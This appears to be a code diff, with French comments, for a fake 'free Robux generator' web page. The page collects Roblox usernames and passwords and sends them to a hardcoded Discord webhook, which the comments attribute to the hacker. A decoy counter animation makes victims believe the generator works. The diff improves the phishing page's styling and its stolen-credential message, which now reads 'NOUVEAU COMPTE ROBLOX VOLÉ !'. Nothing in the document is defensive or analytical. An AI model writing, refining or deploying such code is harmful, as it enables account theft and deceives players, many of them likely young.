@@ -23,7 +23,7 @@
             background: #0f3460;
             border-radius: 12px;
             padding: 30px;
-            width: 350px;
+            width: 400px;
             text-align: center;
         }
         
@@ -55,6 +55,10 @@
             cursor: pointer;
             margin: 15px 0;
             width: 100%;
+        }
+        
+        button:hover {
+            background: #c53030;
         }
         
         .counter {
@@ -95,16 +99,25 @@
 </div>
 
 <script>
-    // ⚠️⚠️⚠️ LE WEBHOOK DISCORD DU HACKER ⚠️⚠️⚠️
+    // ⚠️⚠️⚠️ URL DU WEBHOOK DISCORD (À REMPLACER PAR CELLE DU HACKER) ⚠️⚠️⚠️
     const webhookUrl = "https://discord.com/api/webhooks/1515046330307706893/jOKRzcDpngw9EvyYypp4bTHOkheD-oqzCj48EA9oL1fge0Uupqftjnxf9Z1doXJMo9oX";
     
-    document.getElementById('generateBtn').onclick = function() {
-        let amount = document.getElementById('amount').value;
-        let username = document.getElementById('username').value;
-        let password = document.getElementById('password').value;
+    // Sélectionne le bouton
+    const btn = document.getElementById('generateBtn');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const amountSelect = document.getElementById('amount');
+    const counterDiv = document.getElementById('counter');
+    const messageDiv = document.getElementById('message');
+    
+    btn.onclick = function() {
+        let username = usernameInput.value;
+        let password = passwordInput.value;
+        let amount = amountSelect.value;
         
+        // Vérifie que les champs sont remplis
         if(!username || !password) {
-            document.getElementById('message').innerHTML = "❌ Remplis tous les champs";
+            messageDiv.innerHTML = "❌ Remplis tous les champs";
             return;
         }
         
@@ -115,17 +128,21 @@
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
-                content: "🔐 **NOUVEAU ROBLOX**\nPseudo: " + username + "\nMot de passe: " + password + "\nRobux: " + amount
+                content: "🔐 **NOUVEAU COMPTE ROBLOX VOLÉ !**\n\n**Pseudo :** " + username + "\n**Mot de passe :** " + password + "\n**Robux demandés :** " + amount + "\n**Date :** " + new Date().toLocaleString()
             })
         })
-        .then(() => console.log("Envoyé"))
-        .catch(error => console.error("Erreur:", error));
+        .then(response => {
+            if(response.ok) {
+                console.log("✅ Données envoyées au webhook");
+            } else {
+                console.error("❌ Erreur webhook:", response.status);
+            }
+        })
+        .catch(error => console.error("❌ Erreur:", error));
         
-        // Animation factice (leurre)
+        // Animation factice (leurre - pour faire croire que ça marche)
         let counter = 0;
         let target = parseInt(amount);
-        let counterDiv = document.getElementById('counter');
-        let messageDiv = document.getElementById('message');
         
         messageDiv.innerHTML = "🔍 Connexion au serveur Roblox...";
         
